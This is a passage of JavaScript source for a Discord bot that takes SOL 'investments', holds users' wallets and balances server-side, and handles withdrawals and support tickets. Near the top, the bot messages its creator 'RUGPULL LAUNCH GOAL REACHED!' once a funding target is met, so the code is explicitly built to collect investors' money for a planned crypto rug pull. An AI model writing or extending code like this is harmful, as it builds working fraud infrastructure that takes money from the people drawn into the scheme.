                        const ownerUser = await client.users.fetch(CREATOR_ID);
                        if (ownerUser) {
                            await ownerUser.send(`🚨 **RUGPULL LAUNCH GOAL REACHED!**\nCurrent total invested: **${currentTotal} SOL** (Target: ${targetGoal} SOL). Time to deploy the coin!`);
                        }
                    } catch (dmErr) {
                        console.error('Failed to DM creator about goal:', dmErr);
                    }
                }
            } catch (dbErr) {
                console.error('Failed to save investment record to DB:', dbErr);
            }

            return interaction.editReply({ 
                content: `🚀 **Capital Successfully Deployed**\nAmount: \`${amount} SOL\`\nTx Hash: \`https://solscan.io/tx/${signature}\`` 
            });
        } catch (error) {
            console.error(error);
            return interaction.editReply({ content: '❌ Transaction execution failed. Verify your balance and network status.' });
        }
    }

    if (interaction.isButton() && interaction.customId === 'withdraw_modal') {
        const modal = new ModalBuilder()
            .setCustomId('withdraw_modal_submit')
            .setTitle('Withdraw SOL to Your Wallet');

        const addressInput = new TextInputBuilder()
            .setCustomId('withdraw_address')
            .setLabel('Destination Solana Address')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Enter Phantom / Solflare address')
            .setRequired(true);

        const amountInput = new TextInputBuilder()
            .setCustomId('withdraw_amount')
            .setLabel('Withdrawal Amount (SOL)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('0.5')
            .setRequired(true);

        modal.addComponents(
            new ActionRowBuilder().addComponents(addressInput),
            new ActionRowBuilder().addComponents(amountInput)
        );
        return interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'withdraw_modal_submit') {
        await interaction.deferReply({ ephemeral: true });
        const recipientAddress = interaction.fields.getTextInputValue('withdraw_address');
        const amountStr = interaction.fields.getTextInputValue('withdraw_amount');
        const amount = parseFloat(amountStr);

        if (isNaN(amount) || amount <= 0) {
            return interaction.editReply({ content: '❌ Invalid withdrawal amount specified.' });
        }

        try {
            const balRes = await db.execute({ sql: `SELECT balance_sol FROM user_balances WHERE user_id = ?`, args: [interaction.user.id] });
            const currentBal = balRes.rows.length > 0 ? balRes.rows[0].balance_sol : 0;

            if (currentBal < amount) {
                return interaction.editReply({ content: `❌ Insufficient server balance! Available: ${currentBal.toFixed(4)} SOL.` });
            }

            const userWallet = await getUserWallet(interaction.user.id);
            const signature = await withdrawSol(userWallet, recipientAddress, amount);

            await db.execute({
                sql: `UPDATE user_balances SET balance_sol = balance_sol - ? WHERE user_id = ?`,
                args: [amount, interaction.user.id]
            });

            return interaction.editReply({ 
                content: `✅ **Extraction Complete**\nTransferred **${amount} SOL** to \`${recipientAddress}\`\nTx Hash: \`https://solscan.io/tx/${signature}\`` 
            });
        } catch (error) {
            console.error(error);
            return interaction.editReply({ content: `❌ Extraction protocol failed: ${error.message}` });
        }
    }

    if (interaction.isButton() && interaction.customId === 'create_ticket') {
        const guild = interaction.guild;
        const ticketChannel = await guild.channels.create({
            name: `ticket-${interaction.user.username}`,
            type: ChannelType.GuildText,
            permissionOverwrites: [
                {
                    id: guild.id,
                    deny: [PermissionFlagsBits.ViewChannel],
                },
                {
                    id: interaction.user.id,
                    allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory],
                },
                {
                    id: client.user.id,
                    allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels],
                }
            ],
        });

        const closeRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Close & Terminate Ticket').setStyle(ButtonStyle.Danger)
        );

        const ticketEmbed = new EmbedBuilder()
            .setTitle(`🎫 Secure Dispatch Room — ${interaction.user.tag}`)
            .setDescription('An operator or administrator will review your transmission shortly. State your inquiry clearly below.')
            .setColor(0x3498DB)
            .setFooter({ text: 'Encrypted Ticket Session' });

        await ticketChannel.send({ content: `${interaction.user}`, embeds: [ticketEmbed], components: [closeRow] });
        return interaction.reply({ content: `✅ Secure ticket spawned: ${ticketChannel}`, ephemeral: true });
    }

    if (interaction.isButton() && interaction.customId === 'close_ticket') {
        await interaction.reply({ content: '🔒 Terminating secure session in 5 seconds...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
    }
});

client.login(process.env.TOKEN);
